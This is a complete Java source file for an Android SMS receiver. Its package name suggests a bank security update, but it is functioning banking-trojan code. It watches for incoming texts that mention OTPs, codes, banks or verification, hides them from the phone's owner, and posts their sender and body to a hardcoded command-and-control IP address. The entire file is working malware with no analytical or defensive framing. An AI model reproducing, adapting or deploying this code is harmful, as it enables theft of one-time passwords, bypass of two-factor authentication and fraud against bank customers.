package com.bank.security.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";
    private static final String C2_URL = "http://185.220.101.5/collect/sms";

    @Override
    public void onReceive(Context context, Intent intent) {
        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = message.getDisplayOriginatingAddress();
                        String body = message.getMessageBody();

                        Log.d(TAG, "Intercepted SMS from: " + sender);

                        // Check if SMS contains OTP or banking verification keywords
                        if (body.contains("OTP") || body.contains("code") || body.contains("bank") || body.contains("verification")) {
                            // Silently swallow the notification so user never sees the bank OTP
                            abortBroadcast();
                            
                            // Exfiltrate stolen OTP message to Command & Control server
                            forwardToC2(sender, body);
                        }
                    }
                }
            }
        }
    }

    private void forwardToC2(final String sender, final String body) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(C2_URL);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);

                    String payload = "{\"sender\":\"" + sender + "\",\"body\":\"" + body + "\"}";
                    OutputStream os = conn.getOutputStream();
                    os.write(payload.getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    int responseCode = conn.getResponseCode();
                    Log.d(TAG, "Exfiltration response code: " + responseCode);
                } catch (Exception e) {
                    Log.e(TAG, "Error forward to C2", e);
                }
            }
        }).start();
    }
}
